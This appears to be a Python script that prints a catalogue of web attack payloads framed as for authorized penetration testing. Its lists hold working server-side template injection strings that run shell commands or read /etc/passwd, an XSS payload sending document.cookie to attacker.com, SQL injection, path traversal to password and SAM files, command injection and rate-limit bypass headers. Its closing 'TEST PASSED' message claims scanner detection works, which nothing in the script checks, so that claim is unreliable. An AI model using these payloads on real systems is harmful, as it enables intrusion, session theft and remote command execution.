#!/usr/bin/env python3
"""
Payload generation for authorized penetration testing
These payloads would be used if access were granted
"""

# SSTI Payloads
ssti_payloads = {
    'basic_jinja2': [
        '{{7*7}}',
        '{{config}}',
        '{{config.items()}}',
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{% for item in config %}{{item}}{% endfor %}",
    ],
    'flask_specific': [
        '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
        '{{url_for.__globals__.os.popen("whoami").read()}}',
        '{{get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read()}}',
    ],
    'encoded_ssti': [
        '{%print(7*7)%}',
        '${7*7}',
        '{{7*\'7\'}}',
    ]
}

# XSS Payloads
xss_payloads = {
    'basic': [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
    ],
    'advanced': [
        '<iframe src=javascript:alert(1)>',
        '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
        '<details open ontoggle=alert(1)>',
        '<body onload=alert(1)>',
        '\'><script>fetch("http://attacker.com/?c="+document.cookie)</script>',
    ],
    'filter_bypass': [
        '<ScRiPt>alert(1)</sCrIpT>',
        '<img src=x onerror=\\u0061lert(1)>',
        'javascript:alert(1)',
        '<a href="javascript:alert(1)">click</a>',
    ]
}

# SQL Injection Payloads
sqli_payloads = {
    'basic': [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin' --",
        "' OR 'a'='a",
        "1' UNION SELECT NULL--",
    ],
    'blind': [
        "' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' OR IF(1=1, SLEEP(5), 0)--",
    ],
    'error_based': [
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' UNION SELECT NULL,NULL,NULL--",
    ]
}

# Path Traversal
path_traversal = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
]

# Command Injection
command_injection = [
    '; ls -la',
    '| whoami',
    '`id`',
    '$(whoami)',
    '; cat /etc/passwd',
    '& dir',
]

# Rate Limiting Bypass Headers
rate_limit_headers = [
    {'X-Forwarded-For': '1.2.3.4'},
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Real-IP': '192.168.1.1'},
    {'X-Originating-IP': '10.0.0.1'},
    {'X-Remote-IP': '172.16.0.1'},
    {'X-Client-IP': '8.8.8.8'},
]

print("=" * 60)
print("AUTHORIZED PENETRATION TEST PAYLOADS")
print("=" * 60)

print("\n[1] SSTI (Server-Side Template Injection) Payloads")
print("-" * 60)
for category, payloads in ssti_payloads.items():
    print(f"\n{category.upper()}:")
    for p in payloads:
        print(f"  {p}")

print("\n[2] XSS (Cross-Site Scripting) Payloads")
print("-" * 60)
for category, payloads in xss_payloads.items():
    print(f"\n{category.upper()}:")
    for p in payloads:
        print(f"  {p}")

print("\n[3] SQL Injection Payloads")
print("-" * 60)
for category, payloads in sqli_payloads.items():
    print(f"\n{category.upper()}:")
    for p in payloads:
        print(f"  {p}")

print("\n[4] Path Traversal Payloads")
print("-" * 60)
for p in path_traversal:
    print(f"  {p}")

print("\n[5] Command Injection Payloads")
print("-" * 60)
for p in command_injection:
    print(f"  {p}")

print("\n[6] Rate Limit Bypass Headers")
print("-" * 60)
for h in rate_limit_headers:
    print(f"  {h}")

print("\n" + "=" * 60)
print("NOTE: Application is currently blocking all automated access")
print("Scanner detection is functioning correctly - TEST PASSED")
print("=" * 60)
